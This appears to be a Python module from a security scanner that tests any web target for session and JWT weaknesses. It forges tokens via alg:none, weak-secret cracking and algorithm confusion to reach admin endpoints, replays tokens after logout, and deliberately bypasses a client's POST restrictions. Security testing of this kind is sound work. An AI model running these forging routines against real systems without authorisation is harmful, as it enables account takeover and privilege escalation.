"""
PHANTOM AI - Session & Token Abuse Scanner (CAMADA 4)

Tests session-level and token-level abuse vulnerabilities on ANY target:
- JWT replay after logout (CWE-613)
- JWT role escalation via secret cracking + claim tampering (CWE-269)
- Logout bypass verification (CWE-613)
- Token survives password change (CWE-613)
- Enhanced session fixation (CWE-384)
- XSS → Token → Privilege Escalation chain (CWE-79 + CWE-269)
- Cookie security flags (Secure, HttpOnly, SameSite)
- Refresh token rotation and reuse after rotation (CWE-613)
- Refresh token validity after logout (CWE-613)
- Concurrent sessions / multi-device session management
- Long-lived token detection (no exp / excessive exp)

All endpoint discovery is GENERIC — no target-specific hardcoding.
Uses aiohttp directly to bypass SafeAsyncClient POST restrictions.

Author: PHANTOM AI Team
Version: 2.0.0
"""

from __future__ import annotations

import asyncio
import json
import os
import ssl
import time
from typing import Any, Optional

import aiohttp

from scanning.findings import Finding, VulnType, Severity
from scanning.vuln_scanner import ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter

logger = get_logger(__name__)

# FIX SAFE-01: Safety mode check
# Session tests use POST but are generally safe (test session mechanics, not modify data)
# However, password change tests should be blocked in safe modes
SAFE_MODE = os.environ.get("PHANTOM_SAFE_MODE", "safe").lower()
ALLOW_DESTRUCTIVE_SESSION_TESTS = SAFE_MODE in ("standard", "aggressive")

# Reuse JWT utilities from existing jwt_scanner
from scanning.modules.jwt_scanner import JWTToken, JWTManipulator, WEAK_SECRETS

# Reuse SharedFindingsStore for XSS chain
from utils.shared_findings_store import SharedFindingsStore, VulnType as StoreVulnType
from scanning.scan_context import ScanContext

# ---------------------------------------------------------------------------
# Generic endpoint lists — work on any website
# ---------------------------------------------------------------------------

GENERIC_WHOAMI_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/rest/user/whoami", "/api/v1/me", "/auth/me", "/userinfo",
    "/api/users/me", "/api/current-user", "/api/v1/user",
    "/api/v1/profile", "/api/v1/account", "/me",
]

GENERIC_LOGOUT_PATHS = [
    "/logout", "/signout", "/api/logout", "/api/auth/logout",
    "/api/v1/auth/logout", "/rest/user/logout", "/auth/logout",
    "/api/signout", "/session/destroy", "/oauth/revoke",
    "/api/v1/logout", "/api/v1/signout",
]

GENERIC_ADMIN_PATHS = [
    "/api/admin", "/admin/api", "/api/users", "/api/v1/users",
    "/rest/admin/application-configuration", "/admin/config",
    "/api/admin/users", "/api/v1/admin/users", "/management/users",
    "/api/v1/admin", "/admin/dashboard", "/api/admin/config",
]

GENERIC_PASSWORD_CHANGE_PATHS = [
    "/api/user/change-password", "/rest/user/change-password",
    "/api/account/password", "/api/v1/auth/password",
    "/api/me/password", "/auth/password", "/api/v1/user/password",
    "/api/password", "/api/change-password",
]

# Login endpoints for session fixation test
GENERIC_LOGIN_PATHS = [
    "/rest/user/login", "/api/login", "/api/v1/login",
    "/login", "/auth/login", "/api/auth/login", "/api/v1/auth/login",
]

# Refresh token endpoints (generic)
GENERIC_REFRESH_PATHS = [
    "/api/token/refresh", "/api/auth/refresh", "/api/v1/auth/refresh",
    "/auth/refresh", "/oauth/token", "/token/refresh", "/api/refresh",
    "/api/v1/token/refresh", "/rest/user/refresh", "/auth/token/refresh",
    "/api/auth/token", "/api/v1/refresh", "/refresh",
]

# Active sessions endpoints (for concurrent session testing)
GENERIC_SESSIONS_PATHS = [
    "/api/sessions", "/api/user/sessions", "/api/v1/sessions",
    "/api/me/sessions", "/api/account/sessions", "/api/auth/sessions",
    "/api/v1/user/sessions", "/api/v1/auth/sessions",
]

# Role claims in JWT payload (generic across frameworks)
ROLE_CLAIM_NAMES = [
    "role", "roles", "admin", "is_admin", "isAdmin",
    "scope", "scopes", "permissions", "groups", "level",
    "user_type", "userType", "type", "access_level", "privilege",
]

# Values to try for privilege escalation per claim
ESCALATION_VALUES: dict[str, list] = {
    "role": ["admin", "administrator", "superadmin", "root", "staff"],
    "roles": [["admin"], ["administrator"]],
    "admin": [True, 1, "true", "yes"],
    "is_admin": [True, 1, "true"],
    "isAdmin": [True, 1, "true"],
    "scope": ["admin", "admin:*", "write:all", "*"],
    "scopes": ["admin", "admin:*", "*"],
    "permissions": [["admin"], ["*"]],
    "groups": [["admin"], ["administrators"]],
    "level": [0, 1, 99, 100, 999],
    "user_type": ["admin", "staff", "superuser"],
    "userType": ["admin", "staff", "superuser"],
    "type": ["admin"],
    "access_level": ["admin", "full", "root"],
    "privilege": ["admin", "root", "superuser"],
}

# Session cookie name patterns
SESSION_COOKIE_NAMES = [
    "connect.sid", "PHPSESSID", "JSESSIONID", "session",
    "_session", "sid", "sessionid", "session_id", "SESSION",
    "ASP.NET_SessionId", "ASPSESSIONID", "laravel_session",
    "ci_session", "flask_session", "_csrf", "token",
]

# Password change body variations (generic)
PASSWORD_CHANGE_BODIES = [
    lambda old, new: {"password": new, "new": new, "current": old},
    lambda old, new: {"old_password": old, "new_password": new},
    lambda old, new: {"currentPassword": old, "newPassword": new},
    lambda old, new: {"current": old, "new": new, "repeat": new},
    lambda old, new: {"oldPassword": old, "newPassword": new, "confirmPassword": new},
]

# SSL context for local/self-signed targets
_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

class SessionAbuseScanner(ScanModule):
    """Session & Token Abuse Scanner — works on any target."""

    name = "session_abuse"

    def __init__(
        self,
        settings: Any,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self._discovered: dict[str, tuple[str, int]] = {}  # category -> (path, status)
        self._cracked_secret: Optional[str] = None
        self._role_escalation_proved = False

    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """Execute session & token abuse scan."""
        
        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        findings: list[dict] = []
        base_url = host if host.startswith("http") else f"https://{host}"

        # Extract auth context
        if isinstance(asset_data, dict):
            auth_ctx = asset_data.get("auth_context")
        if not auth_ctx or not getattr(auth_ctx, "has_auth", False):
            logger.warning("[SESSION_ABUSE] No auth_context — skipping")
            # THEME-3 FIX: Record skip reason
            if auth_ctx and hasattr(auth_ctx, 'record_skip'):
                auth_ctx.record_skip("session_abuse_scanner", "requires_auth_token_for_session_tests")
            return {"findings": findings, "info": [{"message": "No auth token available"}]}

        # THEME-3 FIX: Record auth usage
        if hasattr(auth_ctx, 'record_usage'):
            auth_ctx.record_usage("session_abuse_scanner", auth_type_required="jwt")

        token = auth_ctx.token
        auth_headers = auth_ctx.auth_headers

        # Extract user personas for cross-session testing
        if isinstance(asset_data, dict):
            self._user_personas = asset_data.get("user_personas")
        if self._user_personas and self._user_personas.has_multiple_users:
            logger.info(
                f"[SESSION_ABUSE] Multi-user mode: {len(self._user_personas.all_contexts)} "
                f"sessions available for cross-session testing"
            )

        logger.info(
            f"[SESSION_ABUSE] Starting scan with token from {auth_ctx.method} "
            f"({auth_ctx.email})"
        )

        # THEME-4: Consume cross-module data for enhanced testing
        cross_module_tokens = []
        cross_module_creds = []
        chain_opportunities = []
        try:
            from utils.shared_findings_store import SharedFindingsStore
            store = SharedFindingsStore.get_instance()

            # Get tokens extracted by SQLi or other modules
            cross_module_tokens = store.get_extracted_tokens("session_abuse")
            if cross_module_tokens:
                logger.info(f"[SESSION_ABUSE] Found {len(cross_module_tokens)} tokens from other modules")

            # Get credentials for session testing
            cross_module_creds = store.get_extracted_credentials("session_abuse")
            if cross_module_creds:
                logger.info(f"[SESSION_ABUSE] Found {len(cross_module_creds)} credentials from other modules")

            # Get chain opportunities (XSS → session theft, etc.)
            chain_opportunities = store.get_chain_opportunities("session_abuse")
            if chain_opportunities:
                logger.info(f"[SESSION_ABUSE] Found {len(chain_opportunities)} chain opportunities")

        except Exception as e:
            logger.debug(f"[SESSION_ABUSE] Cross-module data fetch failed: {e}")

        timeout = aiohttp.ClientTimeout(total=15)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Phase 0: Discover working endpoints
            await self._discover_endpoints(session, base_url, auth_headers, rate_limiter)

            # THEME-4: Test with cross-module extracted tokens
            if cross_module_tokens:
                try:
                    result = await self._test_cross_module_tokens(
                        session, base_url, cross_module_tokens, rate_limiter,
                    )
                    findings.extend(result)
                except Exception as e:
                    logger.debug(f"[SESSION_ABUSE] Cross-module token test error: {e}")

            # Test 1: JWT Replay After Logout
            try:
                result = await self._test_jwt_replay_after_logout(
                    session, base_url, token, auth_headers, rate_limiter,
                )
                findings.extend(result)
            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
                logger.debug(f"[SESSION_ABUSE] Replay test error: {e}")

            # Test 2: JWT Role Escalation (crack secret + forge admin token)
            try:
                result = await self._test_role_escalation(
                    session, base_url, token, rate_limiter,
                )
                findings.extend(result)
            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError, KeyError) as e:
                logger.debug(f"[SESSION_ABUSE] Role escalation error: {e}")

            # Test 3: Logout Bypass (fresh session verification)
            try:
                result = await self._test_logout_bypass_fresh_session(
                    base_url, token, rate_limiter,
                )
                findings.extend(result)
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.debug(f"[SESSION_ABUSE] Logout bypass error: {e}")

            # Test 4: Token Survives Password Change
            try:
                result = await self._test_token_survives_password_change(
                    session, base_url, token, auth_ctx, rate_limiter,
                )
                findings.extend(result)
            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
                logger.debug(f"[SESSION_ABUSE] Password change test error: {e}")

            # Test 5: Enhanced Session Fixation
            try:
                result = await self._test_session_fixation(
                    session, base_url, auth_ctx, rate_limiter,
                )
                findings.extend(result)
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.debug(f"[SESSION_ABUSE] Session fixation error: {e}")

            # Test 6: XSS → Token → Privilege Escalation Chain
            try:
                result = await self._test_xss_token_chain(
                    base_url, token, findings,
                )
                findings.extend(result)
            except (ValueError, KeyError, TypeError) as e:
                logger.debug(f"[SESSION_ABUSE] XSS chain error: {e}")

            # Test 7: Cookie Security Flags (Secure, HttpOnly, SameSite)
            try:
                result = await self._test_cookie_security_flags(
                    session, base_url, rate_limiter,
                )
                findings.extend(result)
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.debug(f"[SESSION_ABUSE] Cookie flags error: {e}")

            # Test 8: Refresh Token Rotation & Reuse
            try:
                result = await self._test_refresh_token_abuse(
                    session, base_url, auth_ctx, rate_limiter,
                )
                findings.extend(result)
            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
                logger.debug(f"[SESSION_ABUSE] Refresh token error: {e}")

            # Test 9: Concurrent Sessions / Multi-Device Logout
            try:
                result = await self._test_concurrent_sessions(
                    session, base_url, auth_ctx, rate_limiter,
                )
                findings.extend(result)
            except (aiohttp.ClientError, asyncio.TimeoutError, json.JSONDecodeError) as e:
                logger.debug(f"[SESSION_ABUSE] Concurrent session error: {e}")

            # Test 10: Long-Lived Token Detection
            try:
                result = self._test_long_lived_token(token, base_url)
                findings.extend(result)
            except Exception as e:
                logger.debug(f"[SESSION_ABUSE] Long-lived token check error: {e}")

            # Test 11: Cross-Session Token Confusion (requires multi-user)
            if hasattr(self, '_user_personas') and self._user_personas and self._user_personas.has_multiple_users:
                try:
                    result = await self._test_cross_session_confusion(
                        session, base_url, rate_limiter,
                    )
                    findings.extend(result)
                except Exception as e:
                    logger.debug(f"[SESSION_ABUSE] Cross-session confusion error: {e}")

        logger.info(f"[SESSION_ABUSE] Scan complete: {len(findings)} findings")

        # ====================================================================
        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
        # Chain engine can use session vulns to escalate XSS/IDOR findings
        # ====================================================================
        try:
            store = SharedFindingsStore.get_instance()
            for f in findings:
                metadata = f.get("metadata", {}) if isinstance(f, dict) else {}
                
                endpoint = f.get("matched_at") or metadata.get("url", base_url)
                subtype = metadata.get("weakness_type", "")
                token_type = metadata.get("token_type", "jwt")
                
                await store.add_finding(
                    {
                        "type": VulnType.SESSION_ABUSE,
                        "endpoint": endpoint,
                        "severity": f.get("severity", "HIGH"),
                        "name": f.get("name", "session_abuse"),
                        "subtype": subtype,
                        "token_type": token_type,
                    },
                    module="session_abuse",
                )

            if findings:
                logger.debug(f"[SESSION_ABUSE] Shared {len(findings)} findings to cross-module store")
        except Exception as e:
            logger.debug(f"[SESSION_ABUSE] Could not share findings: {e}")

        return {"findings": findings, "info": []}


    # ------------------------------------------------------------------
    # Phase 0: Generic Endpoint Discovery
    # ------------------------------------------------------------------

    async def _discover_endpoints(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        auth_headers: dict[str, str],
        rate_limiter: RateLimiter,
    ) -> None:
        """Discover working endpoints on target (generic probing)."""
        # Discover whoami endpoint (authenticated GET that returns user info)
        whoami = await self._probe_first_working(
            session, base_url, GENERIC_WHOAMI_PATHS, "GET", auth_headers, rate_limiter,
        )
        if whoami:
            self._discovered["whoami"] = whoami
            logger.info(f"[SESSION_ABUSE] Whoami endpoint: {whoami[0]} (status {whoami[1]})")

        # Discover admin endpoint — accept 200 (with JSON body) or 401/403
        admin = await self._probe_first_json_or_restricted(
            session, base_url, GENERIC_ADMIN_PATHS, auth_headers, rate_limiter,
        )
        if admin:
            self._discovered["admin"] = admin
            logger.info(f"[SESSION_ABUSE] Admin endpoint: {admin[0]} (status {admin[1]})")

        # Discover logout endpoint
        logout = await self._probe_first_working(
            session, base_url, GENERIC_LOGOUT_PATHS, "POST", auth_headers, rate_limiter,
            accept_statuses={200, 204, 302, 401},
        )
        if logout:
            self._discovered["logout"] = logout
            logger.info(f"[SESSION_ABUSE] Logout endpoint: {logout[0]} (status {logout[1]})")

    async def _probe_first_working(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        paths: list[str],
        method: str,
        headers: dict[str, str],
        rate_limiter: RateLimiter,
        accept_statuses: set[int] | None = None,
    ) -> Optional[tuple[str, int]]:
        """Probe paths, return first that responds with acceptable status."""
        if accept_statuses is None:
            accept_statuses = {200, 201}

        for path in paths:
            url = f"{base_url}{path}"
            await rate_limiter.acquire()
            try:
                if method == "GET":
                    async with session.get(url, headers=headers, ssl=_SSL_CTX) as resp:
                        if resp.status in accept_statuses:
                            return (path, resp.status)
                else:
                    async with session.post(url, headers=headers, ssl=_SSL_CTX) as resp:
                        if resp.status in accept_statuses:
                            return (path, resp.status)
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue
        return None

    async def _probe_first_json_or_restricted(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        paths: list[str],
        headers: dict[str, str],
        rate_limiter: RateLimiter,
    ) -> Optional[tuple[str, int]]:
        """Probe paths for admin endpoints. Accept 401/403 or 200 with JSON body."""
        for path in paths:
            url = f"{base_url}{path}"
            await rate_limiter.acquire()
            try:
                async with session.get(url, headers=headers, ssl=_SSL_CTX) as resp:
                    if resp.status in (401, 403):
                        return (path, resp.status)
                    if resp.status == 200:
                        ct = resp.headers.get("content-type", "")
                        if "json" in ct:
                            return (path, resp.status)
                        # Skip HTML responses (SPA fallback)
            except (aiohttp.ClientError, asyncio.TimeoutError):
                continue
        return None

    # ------------------------------------------------------------------
    # Test 1: JWT Replay After Logout
    # ------------------------------------------------------------------

    async def _test_jwt_replay_after_logout(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        token: str,
        auth_headers: dict[str, str],
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Test if JWT token remains valid after calling logout endpoint."""
        findings: list[dict] = []

        whoami = self._discovered.get("whoami")
        if not whoami:
            return findings

        whoami_path, _ = whoami
        whoami_url = f"{base_url}{whoami_path}"

        # Step 1: Verify token works pre-logout and capture user identity
        await rate_limiter.acquire()
        async with session.get(whoami_url, headers=auth_headers, ssl=_SSL_CTX) as resp:
            if resp.status != 200:
                return findings
            try:
                pre_data = await resp.json()
                pre_body = json.dumps(pre_data)
            except (json.JSONDecodeError, aiohttp.ContentTypeError):
                pre_data = {}
                pre_body = ""

        # Extract user identifier from pre-logout response for comparison
        pre_user_id = self._extract_user_id(pre_data)

        # Step 2: Call logout endpoint
        logout = self._discovered.get("logout")
        logout_found = False
        logout_path = None
        logout_response_hint = ""

        if logout:
            logout_path, _ = logout
            await rate_limiter.acquire()
            try:
                async with session.post(
                    f"{base_url}{logout_path}", headers=auth_headers, ssl=_SSL_CTX,
                ) as resp:
                    if resp.status in (200, 204, 302):
                        logout_found = True
                        # Check if logout response hints at actual invalidation
                        try:
                            logout_body = await resp.text()
                            if any(hint in logout_body.lower() for hint in
                                   ["logged out", "session destroyed", "token revoked",
                                    "successfully", "invalidated"]):
                                logout_response_hint = "Server confirmed logout"
                        except Exception as e:
                            # FIX 2026-02-12: Log body read error (DEBUG - expected)
                            logger.debug(f"[Session] Logout body read error: {e}")
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                # FIX 2026-02-12: Log logout POST error (DEBUG - expected)
                logger.debug(f"[Session] Logout POST error: {e}")

        # Also try GET on logout paths (some frameworks use GET)
        if not logout_found:
            for path in GENERIC_LOGOUT_PATHS[:4]:
                await rate_limiter.acquire()
                try:
                    async with session.get(
                        f"{base_url}{path}", headers=auth_headers, ssl=_SSL_CTX,
                    ) as resp:
                        if resp.status in (200, 204, 302):
                            logout_found = True
                            logout_path = path
                            break
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    continue

        # Step 3: Replay token after logout using FRESH session (no shared cookies)
        # CRITICAL: Use DummyCookieJar to guarantee NO cookies are sent
        # This proves JWT-only auth bypass, not cookie-based session reuse
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(
            timeout=timeout,
            cookie_jar=aiohttp.DummyCookieJar(),
        ) as fresh_session:
            await rate_limiter.acquire()
            async with fresh_session.get(whoami_url, headers=auth_headers, ssl=_SSL_CTX) as resp:
                if resp.status == 200:
                    try:
                        post_data = await resp.json()
                    except (json.JSONDecodeError, aiohttp.ContentTypeError):
                        post_data = {}

                    # Verify it's the SAME user identity (not just any 200)
                    post_user_id = self._extract_user_id(post_data)
                    same_identity = (
                        pre_user_id and post_user_id and pre_user_id == post_user_id
                    )

                    # Only report if:
                    # 1. Logout endpoint was found and called successfully
                    # 2. Same user identity confirmed before and after
                    if not logout_found:
                        # No logout endpoint = can't test invalidation
                        return findings

                    if not same_identity and pre_user_id:
                        # Different identity = logout might have worked (partial)
                        logger.debug(
                            f"[SESSION_ABUSE] Identity changed after logout: "
                            f"{pre_user_id} -> {post_user_id}"
                        )
                        return findings

                    # Adjust confidence based on evidence quality
                    confidence = 75  # Base confidence
                    if same_identity:
                        confidence += 10  # Same user ID confirmed
                    if logout_response_hint:
                        confidence += 5  # Server said it logged out

                    # Check JWT exp claim for context
                    exp_info = self._get_jwt_exp_info(token)

                    findings.append(Finding(
                        vuln_type=VulnType.SESSION_HIJACKING,
                        name="JWT Token Valid After Logout",
                        severity=Severity.HIGH,
                        description=(
                            "JWT token remains valid after logout. The server does not "
                            "maintain a token denylist or use server-side session state. "
                            "An attacker who obtains a JWT (via XSS, network sniffing, or "
                            "log exposure) can replay it indefinitely until natural expiration."
                        ),
                        host=base_url,
                        endpoint=whoami_url,
                        evidence=[
                            f"Pre-logout: GET {whoami_path} -> 200 (user: {pre_user_id or 'unknown'})",
                            f"Logout: POST {logout_path} -> {'success' if logout_found else 'failed'}"
                            + (f" ({logout_response_hint})" if logout_response_hint else ""),
                            f"Post-logout replay (fresh session): GET {whoami_path} -> 200",
                            f"Identity verified: {'SAME user' if same_identity else 'not confirmed'}",
                            f"Token: {token[:40]}...",
                            f"JWT exp: {exp_info}",
                        ],
                        cvss_score=7.1,
                        cwe_id="CWE-613",
                        confidence_score=min(95, max(50, confidence)),
                        remediation=(
                            "Implement server-side token denylist (Redis/DB). On logout, "
                            "add the token's JTI to the denylist. Validate against denylist "
                            "on every authenticated request. Use short-lived access tokens "
                            "(5-15 min) with refresh token rotation."
                        ),
                        metadata={
                            "module": "session_abuse",
                            "attack_type": "jwt_replay_after_logout",
                            "logout_endpoint_found": logout_found,
                            "logout_path": logout_path,
                            "whoami_path": whoami_path,
                            "token_prefix": token[:40],
                            "same_identity_confirmed": same_identity,
                            "pre_user_id": pre_user_id,
                            "post_user_id": post_user_id,
                            "jwt_exp": exp_info,
                        },
                    ).to_dict())

        # If no logout endpoint found at all, report that too
        if not logout_found and not logout:
            findings.append(Finding(
                vuln_type=VulnType.SESSION_HIJACKING,
                name="No Logout Endpoint Found",
                severity=Severity.MEDIUM,
                description=(
                    "No functional logout endpoint was found on the target. "
                    "Without a logout mechanism, JWT tokens cannot be revoked "
                    "and remain valid for their entire lifetime. Users cannot "
                    "effectively terminate their sessions."
                ),
                host=base_url,
                endpoint=base_url,
                evidence=[
                    f"Probed {len(GENERIC_LOGOUT_PATHS)} logout paths — none responded",
                    f"Token type: Bearer JWT",
                ],
                cvss_score=5.4,
                cwe_id="CWE-613",
                confidence_score=80,
                remediation=(
                    "Implement a logout endpoint that adds the token to a server-side "
                    "denylist. Use short-lived access tokens with refresh token rotation."
                ),
                metadata={
                    "module": "session_abuse",
                    "attack_type": "missing_logout_endpoint",
                    "paths_probed": GENERIC_LOGOUT_PATHS,
                },
            ).to_dict())

        return findings

    # ------------------------------------------------------------------
    # Test 2: JWT Role Escalation (crack secret + forge admin token)
    # ------------------------------------------------------------------

    async def _test_role_escalation(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        token: str,
        rate_limiter: RateLimiter,
    ) -> list[dict]:
        """Crack JWT secret or use alg:none, modify role, prove admin access."""
        findings: list[dict] = []

        # Parse JWT
        parsed = JWTToken.parse(token)
        if not parsed:
            return findings

        alg = parsed.get_algorithm().upper()

        # Find role claims in payload
        role_claims = self._find_role_claims(parsed.payload)
        if not role_claims:
            logger.debug("[SESSION_ABUSE] No role claims found in JWT payload")
            return findings

        # Build list of forging strategies
        # Each strategy: (method_name, forge_fn) where forge_fn(header, payload) -> token
        strategies: list[tuple[str, Any]] = []

        # Strategy 1: alg:none (works on any algorithm if server doesn't validate)
        def forge_none(header: dict, payload: dict) -> str:
            h = header.copy()
            h["alg"] = "none"
            return JWTManipulator.create_token(h, payload, "", "none")

        strategies.append(("alg_none", forge_none))

        # Also try "None", "NONE", "nOnE" variants
        for none_variant in ("None", "NONE", "nOnE"):
            def forge_none_var(header: dict, payload: dict, v=none_variant) -> str:
                h = header.copy()
                h["alg"] = v
                return JWTManipulator.create_token(h, payload, "", "none")
            strategies.append((f"alg_{none_variant}", forge_none_var))

        # Strategy 2: HMAC brute-force (only for HS* algorithms)
        if alg.startswith("HS"):
            cracked = None
            for secret in WEAK_SECRETS:
                if JWTManipulator.verify_hmac_signature(parsed, secret):
                    cracked = secret
                    self._cracked_secret = secret
                    # SECURITY: Don't log actual secret, only confirmation + length
                    logger.info(f"[SESSION_ABUSE] JWT weak secret found (length={len(cracked)})")
                    break

            if cracked:
                def forge_hmac(header: dict, payload: dict, s=cracked, a=alg) -> str:
                    return JWTManipulator.create_token(header, payload, s, a)
                strategies.append(("weak_secret", forge_hmac))

        # Strategy 3: Algorithm confusion (RS256 -> HS256 using various keys)
        # CVE-2016-5431: If server uses RSA public key to verify, but attacker
        # switches to HS256, the server may use the public key as HMAC secret
        if alg.startswith("RS") or alg.startswith("ES") or alg.startswith("PS"):
            # 3a: Empty secret
            def forge_alg_confusion_empty(header: dict, payload: dict) -> str:
                h = header.copy()
                h["alg"] = "HS256"
                return JWTManipulator.create_token(h, payload, "", "HS256")
            strategies.append(("alg_confusion_empty", forge_alg_confusion_empty))

            # 3b: Try common placeholder secrets for confusion attack
            confusion_secrets = [
                "secret", "key", "public", "",
                "-----BEGIN PUBLIC KEY-----",  # Some libs use raw PEM
            ]
            for secret in confusion_secrets:
                def forge_alg_confusion_secret(header: dict, payload: dict, s=secret) -> str:
                    h = header.copy()
                    h["alg"] = "HS256"
                    return JWTManipulator.create_token(h, payload, s, "HS256")
                strategies.append((f"alg_confusion_{secret[:8] or 'empty'}", forge_alg_confusion_secret))

            # 3c: Try HS384 and HS512 (some libs only block HS256)
            for hs_alg in ("HS384", "HS512"):
                def forge_alg_other_hs(header: dict, payload: dict, a=hs_alg) -> str:
                    h = header.copy()
                    h["alg"] = a
                    return JWTManipulator.create_token(h, payload, "", a)
                strategies.append((f"alg_confusion_{hs_alg}", forge_alg_other_hs))

            # 3d: Try to fetch and use public key from JWKS endpoint
            jwks_endpoints = [
                f"{base_url}/.well-known/jwks.json",
                f"{base_url}/oauth/.well-known/jwks.json",
                f"{base_url}/.well-known/openid-configuration",
            ]
            for jwks_url in jwks_endpoints:
                try:
                    jwks_resp = await session.get(jwks_url, timeout=5)
                    if jwks_resp.status == 200:
                        jwks_text = await jwks_resp.text()
                        # Extract any key-like strings to use as HMAC secret
                        import json
                        try:
                            jwks_data = json.loads(jwks_text)
                            # Try using the raw JWKS as secret
                            def forge_with_jwks(header: dict, payload: dict, k=jwks_text) -> str:
                                h = header.copy()
                                h["alg"] = "HS256"
                                return JWTManipulator.create_token(h, payload, k, "HS256")
                            strategies.append(("alg_confusion_jwks", forge_with_jwks))

                            # Try using each key's 'n' value (RSA modulus)
                            if "keys" in jwks_data:
                                for key in jwks_data["keys"][:2]:
                                        if "n" in key:
                                            def forge_with_n(header: dict, payload: dict, n=key["n"]) -> str:
                                                h = header.copy()
                                                h["alg"] = "HS256"
                                                return JWTManipulator.create_token(h, payload, n, "HS256")
                                            strategies.append(("alg_confusion_pubkey_n", forge_with_n))
                        except json.JSONDecodeError as e:
                            # FIX 2026-02-12: Log JWKS parse error (DEBUG - expected)
                            logger.debug(f"[Session] JWKS JSON decode error: {e}")
                        break  # Found JWKS, stop searching
                except Exception as e:
                    # FIX 2026-02-12: Log JWKS fetch error (DEBUG - expected)
                    logger.debug(f"[Session] JWKS fetch error: {e}")

        # Try each strategy with each role claim
        for strategy_name, forge_fn in strategies:
            if self._role_escalation_proved:
                break

            for claim_path, original_value in role_claims:
                if self._role_escalation_proved:
                    break

                claim_name = claim_path.split(".")[-1]
                escalation_vals = ESCALATION_VALUES.get(claim_name, ["admin"])

                for esc_value in escalation_vals:
                    forged_payload = _deep_set(parsed.payload.copy(), claim_path, esc_value)
                    forged_token = forge_fn(parsed.header, forged_payload)
                    forged_headers = {"Authorization": f"Bearer {forged_token}"}

                    # Test against admin endpoints
                    admin_access = await self._verify_admin_access(
                        session, base_url, forged_headers, rate_limiter,
                    )
                    if admin_access:
                        endpoint, status, data_preview = admin_access
                        self._role_escalation_proved = True

                        # Determine description based on strategy
                        if strategy_name == "weak_secret":
                            method_desc = (
                                f"JWT HMAC secret is weak ('{self._cracked_secret}'). "
                                f"By cracking the secret, modifying the '{claim_path}' "
                                f"claim, and re-signing, an attacker gains admin access."
                            )
                            remediation = (
                                "1. Use a cryptographically random secret (256+ bits). "
                                "2. Migrate to asymmetric signing (RS256/ES256). "
                                "3. Validate roles from database, not JWT claims. "
                            )
                        elif strategy_name.startswith("alg_none") or strategy_name.startswith("alg_N"):
                            method_desc = (
                                f"Server accepts JWT tokens with algorithm 'none' "
                                f"(no signature verification). By setting alg=none and "
                                f"modifying '{claim_path}' from '{original_value}' to "
                                f"'{esc_value}', an attacker gains admin access."
                            )
                            remediation = (
                                "1. Reject tokens with alg=none (whitelist allowed algorithms). "
                                "2. Always verify signatures server-side. "
                                "3. Validate roles from database, not JWT claims. "
                            )
                        else:
                            method_desc = (
                                f"Server is vulnerable to JWT algorithm confusion. "
                                f"By switching from {alg} to HS256 and modifying "
                                f"'{claim_path}', an attacker gains admin access."
                            )
                            remediation = (
                                "1. Explicitly whitelist allowed JWT algorithms. "
                                "2. Use asymmetric keys (RS256) with proper validation. "
                                "3. Validate roles from database, not JWT claims. "
                            )

                        findings.append(Finding(
                            vuln_type=VulnType.JWT_VULNERABILITY,
                            name="Privilege Escalation via JWT Tampering",
                            severity=Severity.CRITICAL,
                            description=method_desc,
                            host=base_url,
                            endpoint=f"{base_url}{endpoint}",
                            evidence=[
                                f"Original algorithm: {alg}",
                                f"Attack strategy: {strategy_name}",
                                f"Original claim: {claim_path}={original_value}",
                                f"Forged claim: {claim_path}={esc_value}",
                                f"GET {endpoint} -> {status} (privileged data)",
                                f"Forged token: {forged_token[:50]}...",
                            ],
                            cvss_score=9.8,
                            cwe_id="CWE-269",
                            confidence_score=95,
                            remediation=remediation,
                            metadata={
                                "module": "session_abuse",
                                "attack_type": f"role_escalation_{strategy_name}",
                                "original_alg": alg,
                                "strategy": strategy_name,
                                "original_claim": {claim_path: str(original_value)},
                                "forged_claim": {claim_path: str(esc_value)},
                                "admin_endpoint": endpoint,
                                "admin_status": status,
                                "data_preview": data_preview[:200] if data_preview else "",
                            },
                        ).to_dict())
                        break  # Found one — stop trying values for this claim

        return findings

    async def _verify_admin_access(
        self,
        session: aiohttp.ClientSession,
        base_url: str,
        forged_headers: dict[str, str],
        rate_limiter: RateLimiter,
    ) -> Optional[tuple[str, int, str]]:
        """Try forged token against admin endpoints. Return (path, status, data) or None."""
        admin = self._discovered.get("admin")
        paths_to_try: list[tuple[str, int]] = []
        if admin:
            paths_to_try.append(admin)

        # Add all generic admin paths (with assumed status 0=unknown)
        for path in GENERIC_ADMIN_PATHS:
            if not any(p[0] == path for p in paths_to_try):
                paths_to_try.append((path, 0))

        # Strategy A: Find an endpoint that's restricted (401/403) without auth
        # but accessible (200) with forged token
        for path, discovered_status in paths_to_try:
            url = f"{base_url}{path}"

            # If discovery found 401/403 for normal user,
            # getting 200 with forged token = clear escalation
            if discovered_status in (401, 403):
